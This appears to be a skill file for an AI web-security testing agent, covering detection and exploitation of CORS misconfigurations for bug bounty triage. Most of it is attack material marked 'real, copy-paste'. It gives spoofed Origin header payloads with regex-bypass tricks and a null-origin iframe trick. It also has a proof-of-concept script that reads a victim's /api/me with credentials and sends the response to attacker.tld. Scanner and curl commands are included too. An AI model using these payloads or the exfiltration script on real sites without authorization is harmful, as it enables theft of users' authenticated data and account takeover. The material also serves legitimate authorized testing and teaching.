# SKILL: CORS Misconfiguration

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (cors misconfiguration) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Misconfigured CORS lets attacker-origin JS read authenticated victim responses → ATO via API.

---

## DETECTION
Set `Origin: https://attacker.tld` and check `Access-Control-Allow-Origin` (ACAO) + `Access-Control-Allow-Credentials` (ACAC).

## EXPLOITATION
| ACAO Echo | ACAC | Exploit |
|---|---|---|
| `https://attacker.tld` | `true` | Full credentialed read; PoC fetches /api/me. |
| `*` | `false` | Public data only — usually not a bug. |
| `null` | `true` | iframe with `srcdoc` produces null origin → exploit. |
| Regex bypass | `true` | Wildcards / partial-match (`subdomain bypass`). |

## PAYLOADS (real, copy-paste, grouped)
```http
Origin: https://attacker.tld
Origin: null
Origin: https://target.com.attacker.tld
Origin: https://attacker.tld.target.com
Origin: https://target.com@attacker.tld
Origin: http://target.com/    (trailing slash bypass some regex)
```

PoC HTML:
```html
<script>
fetch('https://target.com/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.tld/?d=' + encodeURIComponent(t)));
</script>
```

Null-origin via iframe srcdoc:
```html
<iframe srcdoc='<script>fetch(...)</script>'></iframe>
```

## BYPASS TECHNIQUES
Regex `^https?://.*\.target\.com$` → `https://target.com.attacker.tld`. `endsWith('target.com')` → `target.com` registered as domain.

## CHAIN POTENTIAL
CORS → /api/me leak → session token / API key → ATO.

## TOOLS
corsy, Burp ActiveScan++, manual

## COMMANDS
```bash
python3 corsy.py -u urls.txt -t 50
# Manual
curl -sk -H 'Origin: https://attacker.tld' 'https://target.com/api/me' -i | grep -i 'access-control'
```

## EDGE CASES / NOT-A-BUG TRAPS
Public-data endpoints with wildcard ACAO are not bugs. ACAC must be true for credentialed exploitation.

## TRIAGE ANGLE (per platform)
Show JS PoC running in your browser fetching authenticated victim data.

## SEVERITY & CVSS
7.5 typical when credentialed.

## REFERENCES
PortSwigger CORS • PayloadsAllTheThings/CORS Misconfiguration
